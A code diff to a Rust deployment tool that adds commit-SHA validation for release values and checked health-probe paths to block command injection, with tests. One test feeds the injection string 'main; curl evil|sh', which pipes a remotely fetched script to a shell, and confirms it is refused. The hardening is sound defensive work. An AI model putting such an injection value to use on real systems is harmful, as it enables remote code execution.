@@ -157,14 +157,28 @@ pub enum DeployError {
 
     #[error("could not write to the run log: {0}")]
     Trace(#[from] anyhow::Error),
+
+    #[error("invalid release {0:?}: must be a commit SHA (hex, 4-64 chars)")]
+    InvalidRelease(String),
+
+    #[error("invalid health path: {0}")]
+    InvalidHealthPath(String),
 }
 
 /// Decides which commit to swapdock: the flag wins, then the recorded release.
+///
+/// The chosen value is validated here as well as in the registry: a release
+/// reaches a build script and an image tag, so it must be a hex commit name and
+/// nothing else.
 pub fn resolve_release(app: &App, flag: Option<&str>) -> Result<String, DeployError> {
-    if let Some(sha) = flag {
-        return Ok(sha.to_string());
+    let release = match flag {
+        Some(sha) => sha,
+        None => app.release.as_deref().ok_or(DeployError::NoRelease)?,
+    };
+    if !registry::is_valid_release_arg(release) {
+        return Err(DeployError::InvalidRelease(release.to_string()));
     }
-    app.release.clone().ok_or(DeployError::NoRelease)
+    Ok(release.to_string())
 }
 
 /// The generated compose override for a green candidate. Only the container
@@ -277,12 +291,9 @@ pub fn run_swap(run: &mut Run, ctx: &Ctx, app: &mut App, release: &str) -> Resul
     let green_name = format!("{}-green-{}", app.compose_svc, short_sha(release));
     start_green(run, ctx, app, release, green_port, &green_name)?;
 
-    health::gate_container(
-        run,
-        "health-wait",
-        green_port,
-        &health::probe_path(app_health_url(app)),
-    )?;
+    let health_path =
+        health::checked_probe_path(app_health_url(app)).map_err(DeployError::InvalidHealthPath)?;
+    health::gate_container(run, "health-wait", green_port, &health_path)?;
 
     apply_new_state(run, ctx, app, green_port)?;
 
@@ -331,12 +342,9 @@ pub fn run_replace(
 
     start_live(run, app, release, port)?;
 
-    health::gate_container(
-        run,
-        "health-wait",
-        port,
-        &health::probe_path(app_health_url(app)),
-    )?;
+    let health_path =
+        health::checked_probe_path(app_health_url(app)).map_err(DeployError::InvalidHealthPath)?;
+    health::gate_container(run, "health-wait", port, &health_path)?;
 
     probe_front(run, app)?;
 
@@ -794,6 +802,31 @@ mod tests {
             resolve_release(&bare, None).unwrap_err(),
             DeployError::NoRelease
         ));
+    }
+
+    #[test]
+    fn resolve_refuses_a_non_commit_release() {
+        let app = sample();
+        for bad in ["main", "main; curl evil|sh", "abc", "9c1f2ab ", "latest"] {
+            let err = resolve_release(&app, Some(bad)).unwrap_err();
+            assert!(
+                matches!(err, DeployError::InvalidRelease(_)),
+                "{bad:?} must be refused, got {err:?}"
+            );
+        }
+        // A recorded release is checked the same way.
+        let mut recorded = sample();
+        recorded.release = Some("main".into());
+        assert!(matches!(
+            resolve_release(&recorded, None).unwrap_err(),
+            DeployError::InvalidRelease(_)
+        ));
+    }
+
+    #[test]
+    fn a_four_char_sha_is_accepted() {
+        let app = sample();
+        assert_eq!(resolve_release(&app, Some("abcd")).unwrap(), "abcd");
     }
 
     #[test]
